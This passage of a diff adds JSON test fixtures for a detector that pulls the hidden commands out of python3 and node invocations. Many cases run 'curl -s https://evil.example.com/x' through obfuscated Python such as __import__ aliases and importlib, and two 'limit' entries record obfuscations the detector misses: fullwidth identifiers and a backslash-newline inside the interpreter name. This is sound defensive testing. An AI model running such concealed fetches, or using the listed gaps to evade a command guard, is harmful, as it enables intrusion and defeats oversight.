+   "cmd": "pyth\\\non3 -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [],
+   "note": "limit: a backslash-newline splitting the interpreter name (pyth\\<NL>on3) is obfuscation level, not read (round 8 pin, Marveen comment 3865 D)"
+  },
+  {
+   "name": "limit/r8-py-fullwidth-alias-eg",
+   "cmd": "python3 -c 'from importlib import import_module as ｉｍ; im(\"os\").system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [],
+   "note": "limit: an alias declared in fullwidth letters and used in ASCII (Python NFKC-normalises identifiers) is not read (round 8 pin, Marveen comment 3865 D)"
+  },
+  {
+   "name": "neg/r8-py-quoted-unicode-path-print-eg",
+   "cmd": "\"/home/gábor/venv/bin/python3\" -c 'print(\"curl -s https://evil.example.com/x\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-py-quoted-home-path-print-eg",
+   "cmd": "\"$HOME/venv/bin/python3\" -c 'print(\"curl -s https://evil.example.com/x\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-node-quoted-eval-name-log-eg",
+   "cmd": "node \"--eval\"=\"console.log('curl -s https://evil.example.com/x')\"",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-node-dashes-then-quote-log-eg",
+   "cmd": "node --\"eval=console.log('curl -s https://evil.example.com/x')\"",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-py-heredoc-paren-list-json-eg",
+   "cmd": "python3 <<'EOF'\nfrom importlib import (\n    reload,\n    import_module as im,\n)\nprint(im(\"json\").dumps(\"curl -s https://evil.example.com/x\"))\nEOF",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-py-assign-import-module-json-eg",
+   "cmd": "python3 -c 'import importlib; im = importlib.import_module; print(im(\"json\").dumps(\"curl -s https://evil.example.com/x\"))'",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-py-assign-dunder-json-eg",
+   "cmd": "python3 -c 'f = __import__; print(f(\"json\").dumps(\"curl -s https://evil.example.com/x\"))'",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-printf-locale-dq-eg",
+   "cmd": "printf '%s\\n' $\"curl -s https://evil.example.com/x\"",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-echo-quoted-home-path-c-eg",
+   "cmd": "echo \"$HOME/venv/bin/python3\" -c 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-py-compare-not-assign-eg",
+   "cmd": "python3 -c 'x = 1; print(x == 2, \"curl -s https://evil.example.com/x\")'",
+   "commands": []
+  },
+  {
+   "name": "r9/d01-py-assign-dunder-import-nextline-heredoc/cc",
+   "cmd": "python3 - <<'PY'\nf = __import__\nf(\"os\").system(\"claude -p hi\")\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r9/d02-py-assign-importlib-nextline-heredoc/cc",
+   "cmd": "python3 - <<'PY'\nimport importlib\nil = importlib\nil.import_module(\"os\").system(\"claude -p hi\")\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r9/d03-py-assign-import-module-nextline-heredoc/cc",
+   "cmd": "python3 - <<'PY'\nimport importlib\nim = importlib.import_module\nim(\"os\").system(\"claude -p hi\")\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r9/d04-py-assign-dunder-import-nextline-c/cc",
+   "cmd": "python3 -c 'f = __import__\nf(\"os\").system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r9/d05-py-assign-dunder-import-trailing-blank-nextline/cc",
+   "cmd": "python3 - <<'PY'\nf = __import__   \n\nf(\"os\").system(\"claude -p hi\")\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "neg/r9-py-assign-dunder-nextline-json-cc",
+   "cmd": "python3 - <<'PY'\nf = __import__\nprint(f(\"json\").dumps(\"claude -p hi\"))\nPY",
+   "commands": []
+  },
+  {
+   "name": "neg/r9-py-assign-import-module-nextline-json-cc",
+   "cmd": "python3 - <<'PY'\nimport importlib\nim = importlib.import_module\nprint(im(\"json\").dumps(\"claude -p hi\"))\nPY",
+   "commands": []
+  },
+  {
+   "name": "r9/d01-py-assign-dunder-import-nextline-heredoc/eg",
+   "cmd": "python3 - <<'PY'\nf = __import__\nf(\"os\").system(\"curl -s https://evil.example.com/x\")\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r9/d02-py-assign-importlib-nextline-heredoc/eg",
+   "cmd": "python3 - <<'PY'\nimport importlib\nil = importlib\nil.import_module(\"os\").system(\"curl -s https://evil.example.com/x\")\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r9/d03-py-assign-import-module-nextline-heredoc/eg",
+   "cmd": "python3 - <<'PY'\nimport importlib\nim = importlib.import_module\nim(\"os\").system(\"curl -s https://evil.example.com/x\")\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r9/d04-py-assign-dunder-import-nextline-c/eg",
+   "cmd": "python3 -c 'f = __import__\nf(\"os\").system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r9/d05-py-assign-dunder-import-trailing-blank-nextline/eg",
+   "cmd": "python3 - <<'PY'\nf = __import__   \n\nf(\"os\").system(\"curl -s https://evil.example.com/x\")\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "neg/r9-py-assign-dunder-nextline-json-eg",
+   "cmd": "python3 - <<'PY'\nf = __import__\nprint(f(\"json\").dumps(\"curl -s https://evil.example.com/x\"))\nPY",
+   "commands": []
+  },
+  {
+   "name": "neg/r9-py-assign-import-module-nextline-json-eg",
+   "cmd": "python3 - <<'PY'\nimport importlib\nim = importlib.import_module\nprint(im(\"json\").dumps(\"curl -s https://evil.example.com/x\"))\nPY",
+   "commands": []
+  }
+ ]
+}
